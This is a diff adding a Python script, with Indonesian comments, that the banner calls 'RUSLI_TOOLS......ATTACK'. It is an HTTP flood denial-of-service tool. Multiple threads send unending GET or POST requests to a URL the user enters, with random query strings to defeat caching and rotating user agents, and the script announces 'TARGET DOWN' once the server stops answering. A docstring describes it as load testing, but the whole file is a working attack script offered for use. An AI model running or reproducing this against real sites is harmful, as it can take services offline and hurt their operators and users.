@@ -1,0 +1,128 @@
+import requests
+import threading
+import time
+import random
+import sys
+import os
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def loading_animation(text, duration=3):
+    """Menampilkan animasi loading dengan efek mengetik."""
+    print(f"\n{text}", end="")
+    bars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        for bar in bars:
+            sys.stdout.write(f"\r{text} {bar}")
+            sys.stdout.flush()
+            time.sleep(0.1)
+    sys.stdout.write(f"\r{text} ✅ SELESAI!\n")
+
+# Banner ASCII Roket
+clear_screen()
+print("\033[96m╔══════════════════════════════════════════════════╗\033[0m")
+print("\033[1;92m")
+print(r"""
+      /|
+     ( : v : )
+      \ ' _ ' /
+       |     |
+      /|     |\
+     / |     | \
+    /  |     |  \
+   /   |     |   \
+""")
+print("\033[0m")
+print("\033[96m║       RUSLI_TOOLS......ATTACK              ║\033[0m")
+print("\033[96m╚══════════════════════════════════════════════════╝\033[0m")
+
+user_agents = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+]
+
+# Variabel global untuk mendeteksi status target
+target_is_down = False
+
+def http_flood_attack(target_url, thread_id, method="GET"):
+    """Fungsi untuk menguji beban HTTP/S pada target URL."""
+    global target_is_down
+    sent_requests = 0
+    error_count = 0
+    
+    print(f"[Thread {thread_id}] 🚀 Mesin dinyalakan...")
+
+    while True:
+        try:
+            headers = {"User-Agent": random.choice(user_agents)}
+            separator = "&" if "?" in target_url else "?"
+            random_url = f"{target_url}{separator}query={random.randint(100000, 999999)}"
+
+            if method.upper() == "GET":
+                response = requests.get(random_url, headers=headers, timeout=3)
+            elif method.upper() == "POST":
+                response = requests.post(random_url, headers=headers, timeout=3)
+            
+            # Reset error count jika sukses
+            error_count = 0
+            sent_requests += 1
+            
+            # Tampilan satu baris yang diperbarui
+            status_color = "\033[92m" if response.status_code == 200 else "\033[93m"
+            sys.stdout.write(f"\r[Thread {thread_id}] \033[94mReq #{sent_requests}\033[0m | Status: {status_color}{response.status_code}\033[0m | ✅ Sukses Terkirim   ")
+            sys.stdout.flush()
+
+        except requests.exceptions.ConnectionError:
+            error_count += 1
+            sys.stdout.write(f"\r[Thread {thread_id}] ❌ Koneksi ditolak   ")
+            sys.stdout.flush()
+        except requests.exceptions.Timeout:
+            error_count += 1
+            sys.stdout.write(f"\r[Thread {thread_id}] ⏳ Timeout   ")
+            sys.stdout.flush()
+        except Exception as e:
+            error_count += 1
+            sys.stdout.write(f"\r[Thread {thread_id}] ⚠️ Error   ")
+            sys.stdout.flush()
+
+        # Logika Deteksi Target Down
+        if error_count > 5 and not target_is_down:
+            target_is_down = True
+            print(f"\n\n\033[91m╔════════════════════════════════════════╗\033[0m")
+            print(f"\033[91m║         ⚠️ TARGET DOWN! ⚠️          ║\033[0m")
+            print(f"\033[91m║   Server tidak merespons sama sekali.  ║\033[0m")
+            print(f"\033[91m╚════════════════════════════════════════╝\033[0m\n")
+
+if __name__ == "__main__":
+    try:
+        url = input("🎯 Masukkan target URL (contoh: http://localhost:8000): ").strip()
+        threads = int(input("🧵 Jumlah thread (rekomendasi 1-3 untuk localhost): "))
+        method = input("⚙️ Method (GET/POST, default GET): ").upper() or "GET"
+
+        if not url.startswith("http"):
+            print("❌ URL harus diawali dengan http:// atau https://")
+            sys.exit(1)
+
+        # Animasi Loading
+        loading_animation("⏳ Menginisialisasi RUSLI_TOOLS...", 2)
+        
+        print(f"\n\033[96m[*] Memulai serangan pada: {url}\033[0m")
+        print(f"\033[93m[*] Menggunakan {threads} thread [{method}]\033[0m")
+        print("Tekan CTRL+C untuk menghentikan.\n")
+
+        for i in range(threads):
+            t = threading.Thread(target=http_flood_attack, args=(url, i, method))
+            t.daemon = True
+            t.start()
+
+        while True:
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        print("\n\n\033[91m🛑 Serangan dihentikan oleh pengguna.\033[0m")
+    except ValueError:
+        print("❌ Input jumlah thread harus berupa angka!")
+    except Exception as e:
+        print(f"⚠️ Terjadi kesalahan: {e}")
